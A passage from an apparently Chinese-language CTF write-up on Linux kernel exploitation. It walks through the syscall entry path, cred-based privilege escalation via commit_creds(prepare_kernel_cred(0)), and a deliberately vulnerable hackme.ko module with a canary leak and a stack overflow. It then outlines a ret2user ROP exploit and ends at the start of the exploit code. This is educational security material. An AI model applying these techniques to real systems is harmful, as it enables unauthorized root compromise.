class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SYM_CODE_START(entry_SYSCALL_64)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	swapgs</span><br><span class="line">	<span class="comment">/* tss.sp2 is scratch space. */</span></span><br><span class="line">	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2)</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">	pushq	$__USER_DS				<span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	<span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">	pushq	%r11					<span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">	pushq	$__USER_CS				<span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">	pushq	%rcx					<span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)</span><br><span class="line">	pushq	%rax					<span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line"></span><br><span class="line">	PUSH_AND_CLEAR_REGS rax=$-ENOSYS</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* IRQs are off. */</span></span><br><span class="line">	movq	%rax, %rdi</span><br><span class="line">	movq	%rsp, %rsi</span><br><span class="line">	call	do_syscall_64		<span class="comment">/* returns with IRQs disabled */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Try to use SYSRET instead of IRET if we&#x27;re returning to</span></span><br><span class="line"><span class="comment">	 * a completely clean 64-bit userspace context.  If we&#x27;re not,</span></span><br><span class="line"><span class="comment">	 * go to the slow exit path.</span></span><br><span class="line"><span class="comment">	 * In the Xen PV case we must use iret anyway.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;&quot;</span>, <span class="string">&quot;jmp	swapgs_restore_regs_and_return_to_usermode&quot;</span>, \</span><br><span class="line">		X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">	movq	RCX(%rsp), %rcx</span><br><span class="line">	movq	RIP(%rsp), %r11</span><br><span class="line"></span><br><span class="line">	cmpq	%rcx, %r11	<span class="comment">/* SYSRET requires RCX == RIP */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP</span></span><br><span class="line"><span class="comment">	 * in kernel space.  This essentially lets the user take over</span></span><br><span class="line"><span class="comment">	 * the kernel, since userspace controls RSP.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * If width of &quot;canonical tail&quot; ever becomes variable, this will need</span></span><br><span class="line"><span class="comment">	 * to be updated to remain correct on both old and new CPUs.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Change top bits to match most significant bit (47th or 56th bit</span></span><br><span class="line"><span class="comment">	 * depending on paging mode) in the address.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_5LEVEL</span></span><br><span class="line">	ALTERNATIVE <span class="string">&quot;shl $(64 - 48), %rcx; sar $(64 - 48), %rcx&quot;</span>, \</span><br><span class="line">		<span class="string">&quot;shl $(64 - 57), %rcx; sar $(64 - 57), %rcx&quot;</span>, X86_FEATURE_LA57</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	shl	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line">	sar	$(<span class="number">64</span> - (__VIRTUAL_MASK_SHIFT+<span class="number">1</span>)), %rcx</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If this changed %rcx, it was not canonical */</span></span><br><span class="line">	cmpq	%rcx, %r11</span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_CS, CS(%rsp)		<span class="comment">/* CS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	movq	R11(%rsp), %r11</span><br><span class="line">	cmpq	%r11, EFLAGS(%rsp)		<span class="comment">/* R11 == RFLAGS */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot</span></span><br><span class="line"><span class="comment">	 * restore RF properly. If the slowpath sets it for whatever reason, we</span></span><br><span class="line"><span class="comment">	 * need to restore it correctly.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a</span></span><br><span class="line"><span class="comment">	 * trap from userspace immediately after SYSRET.  This would cause an</span></span><br><span class="line"><span class="comment">	 * infinite loop whenever #DB happens with register state that satisfies</span></span><br><span class="line"><span class="comment">	 * the opportunistic SYSRET conditions.  For example, single-stepping</span></span><br><span class="line"><span class="comment">	 * this user code:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *           movq	$stuck_here, %rcx</span></span><br><span class="line"><span class="comment">	 *           pushfq</span></span><br><span class="line"><span class="comment">	 *           popq %r11</span></span><br><span class="line"><span class="comment">	 *   stuck_here:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * would never get past &#x27;stuck_here&#x27;.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11</span><br><span class="line">	jnz	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* nothing to check for RSP */</span></span><br><span class="line"></span><br><span class="line">	cmpq	$__USER_DS, SS(%rsp)		<span class="comment">/* SS must match SYSRET */</span></span><br><span class="line">	jne	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We win! This label is here just for ease of understanding</span></span><br><span class="line"><span class="comment">	 * perf profiles. Nothing jumps here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">syscall_return_via_sysret:</span><br><span class="line">	<span class="comment">/* rcx and r11 are already restored (see code above) */</span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span> skip_r11rcx=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now all regs are restored except RSP and RDI.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	pushq	RSP-RDI(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	(%rdi)		<span class="comment">/* RDI */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	popq	%rdi</span><br><span class="line">	popq	%rsp</span><br><span class="line">	swapgs</span><br><span class="line">	sysretq</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_64)</span><br></pre></td></tr></table></figure>

<p>执行完毕后使用sysretq返回到用户态</p>
<p>在x64上有两种返回到用户态的命令</p>
<p><code>sysret</code>和<code>iret</code></p>
<p>注意到<code>x64</code>上<code>syscall</code>一开始和最后<code>sysret</code>之前, 都有一个<code>swapgs</code>, 这个指令也是<code>x64</code>独有的</p>
<p><code>fs,gs</code>这两个段寄存器是<code>x86</code>上引入的两个附加段寄存器</p>
<p><code>fs</code>用于在用户态的<code>glibc</code>中保存<code>TLS</code></p>
<p><code>gs</code>用于在内核态保存<code>percpu</code>变量与<code>canary</code></p>
<p><code>fs</code>在内核态无用,<code>gs</code>在用户态无效</p>
<p><code>swapgs</code>中更换的<code>gs</code>来自于MSR寄存器</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241120204022830.png" alt="image-20241120204022830"></p>
<p>总是当前使用一个,然后MSR记住另一个</p>
<h2 id="privilege-escalation"><a href="#privilege-escalation" class="headerlink" title="privilege escalation"></a>privilege escalation</h2><p>进程权限由<code>task_struct</code>的成员<code>struct cred *cred</code>控制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype <span class="class"><span class="keyword">struct</span> <span class="title">cred</span></span></span><br><span class="line"><span class="class"><span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> usage;</span><br><span class="line">    <span class="type">kuid_t</span> uid;</span><br><span class="line">    <span class="type">kgid_t</span> gid;</span><br><span class="line">    <span class="type">kuid_t</span> suid;</span><br><span class="line">    <span class="type">kgid_t</span> sgid;</span><br><span class="line">    <span class="type">kuid_t</span> euid;</span><br><span class="line">    <span class="type">kgid_t</span> egid;</span><br><span class="line">    <span class="type">kuid_t</span> fsuid;</span><br><span class="line">    <span class="type">kgid_t</span> fsgid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> securebits;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_inheritable;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_permitted;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_effective;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_bset;</span><br><span class="line">    <span class="type">kernel_cap_t</span> cap_ambient;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> jit_keyring;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">session_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">process_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">thread_keyring</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">request_key_auth</span>;</span></span><br><span class="line">    <span class="type">void</span> *security;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">int</span> non_rcu;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要提升一个普通进程的权限到<code>root</code>, 可以找一个<code>root</code>进程的<code>cred</code>抄过来</p>
<p>修改进程<code>cred</code>的方法:</p>
<p>1.要么构造<code>rop</code>链调用内核函数<code>commit_creds(&amp;init_cred);</code>,抄<code>init</code>进程的<code>cred</code>替换当前进程的</p>
<p>2.要么有一个内核内存任意写的利用原语, 找到当前进程<code>task_struct</code>, 然后找到<code>cred</code> , 然后修改之</p>
<h3 id="commit-creds-init-cred"><a href="#commit-creds-init-cred" class="headerlink" title="commit_creds(&amp;init_cred);"></a>commit_creds(&amp;init_cred);</h3><p>这就有一个问题,怎么才能找到<code>init</code>进程的<code>cred</code>?</p>
<p>怎么才能找到<code>struct init_task</code>?</p>
<p><code>Linux 6.2</code>之前有另一个函数<code>prepare_kernel_cred</code>给我们代劳</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//daemon == NULL时返回init_cred</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure>

<p>当参数为<code>NULL</code>时, 该函数返回<code>init_cred</code>,也就是<code>init_task</code>的<code>cred</code></p>
<p>因此可以构造堆栈<code>rop</code>链:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/elevation-of-privilege.png" alt="commit_creds(prepare_kernel_cred(NULL))"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span> =&gt; rdi</span><br><span class="line">prepare_kernel_cred(rdi) =&gt; rax</span><br><span class="line">rax =&gt; rdi</span><br><span class="line">commit_creds(rdi)</span><br></pre></td></tr></table></figure>



<p>但是<code>Linux 6.2</code>及之后如果参数为<code>NULL</code>则直接返回<code>NULL</code>了, 叫没法空手套白狼了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>











<h2 id="vulnerability-kernel-module"><a href="#vulnerability-kernel-module" class="headerlink" title="vulnerability kernel module"></a>vulnerability kernel module</h2><p>题目所给的内核模块<code>hackme.ko</code></p>
<p>模块的初始化函数中调用<code>misc_register</code>函数注册了一个<code>struct miscdevice </code>字符杂项设备</p>
<blockquote>
<p>字符杂项设备</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span>&#123;</span></span><br><span class="line">　　<span class="type">int</span> minor; <span class="comment">//杂项设备的此设备号(如果设置为MISC_DYNAMIC_MINOR，表示系统自动分配未使用的minor)</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *name;		<span class="comment">// /dev目录下的节点名称</span></span><br><span class="line">　　<span class="type">const</span> stuct file_operations *fops;<span class="comment">//驱动主题函数入口指针</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">parent</span>;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">this_device</span>;</span></span><br><span class="line">　　<span class="type">const</span> <span class="type">char</span> *nodename;<span class="comment">//</span></span><br><span class="line">　　<span class="type">mode_t</span> mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>字符杂项设备的主设备号自动被设置为<code>10</code>, 次设备号由<code>minor</code>字段定义</p>
<p><code>misc_register</code>注册字符杂项设备时会自动在<code>/dev/</code>下创建设备节点文件, 节点文件名由<code>name</code>字段给出, <code>nodename</code>表示<code>/dev/下</code>的二级目录, 如果<code>nodename</code>非空则创建节点文件<code>/dev/&lt;nodename&gt;/name</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000000440</span> hackme_misc     dd <span class="number">0F</span>Fh                 ; minor</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; DATA XREF: hackme_init+<span class="number">6</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                                         ; hackme_exit+<span class="number">1</span>↑o</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">4</span> dup(<span class="number">0</span>)             ; <span class="string">&quot;hackme&quot;</span></span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset aHackme       ; name</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq offset hackme_fops   ; fops</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.next</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; <span class="built_in">list</span>.prev</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; parent</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; this_device</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; groups</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dq <span class="number">0</span>                    ; nodename</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 dw <span class="number">0</span>                    ; mode</span><br><span class="line">.data:<span class="number">0000000000000440</span>                 db <span class="number">6</span> dup(<span class="number">0</span>)</span><br><span class="line">.data:<span class="number">0000000000000440</span> _data           ends</span><br></pre></td></tr></table></figure>

<p>其中<code>fops</code>是一个自定义的设备行为指针表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">0000000000000320</span> hackme_fops     file_operations &lt;offset __this_module, <span class="number">0</span>, offset hackme_read, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                         ; DATA XREF: .data:hackme_misc↓o</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  offset hackme_open, <span class="number">0</span>, offset hackme_release, <span class="number">0</span>, <span class="number">0</span>, \</span><br><span class="line">.rodata:<span class="number">0000000000000320</span>                                  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到自定义了<code>read,write,open,release</code>四种行为</p>
<p>在<code>hackme_read</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kstack_buf1[0:size]@kernel stack  =&gt;  hackme_buf@kernel bss  =&gt;  user_data@user </span><br></pre></td></tr></table></figure>

<p>由于<code>size</code>由用户指定,因此这里可以泄露内核堆栈上的<code>canary</code>,以及函数返回地址,以此可以绕过<code>KASLR</code></p>
<p>在<code>hackme_write</code>中发生了这么一个事:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_data[0:size]@user  =&gt;  hackme_buf@kernel bss  =&gt;  kstack_buf2@kernel stack </span><br></pre></td></tr></table></figure>

<p>由于<code>size</code>由用户指定,因此这里可以往内核堆栈写入任意字节,存在堆栈溢出,可以构造<code>ROP</code>链</p>
<p>思路:</p>
<p>1.在hackme_read中泄露canary与返回地址, 绕过KASLR</p>
<p>2.在hackme_write中堆栈溢出, 构造ROP链</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h3><p>假设我们关闭<code>smap,smep,kpti,kaslr,</code> 只考虑绕过<code>canary</code></p>
<p>1.利用<code>hackme_read</code>泄露<code>canary</code></p>
<p>2.利用<code>hackme_write</code>绕过<code>canary</code>检查,继续溢出内核堆栈,构造<code>rop</code>链条</p>
<p>3.更换进程<code>creds</code>提权, 也就是执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>在用户程序中写<code>shellcode</code>实现, 然后在<code>rop</code>链条中<code>ret2shellcode</code></p>
<p>4.返回到用户态</p>
<p>也就是执行<code>iret</code></p>
<p>在用户程序中写<code>shellcode</code>实现</p>
<p>5.起<code>shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//未开启KASLR时,两个函数的地址</span></span><br><span class="line"><span class="type">size_t</span> addr_commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span 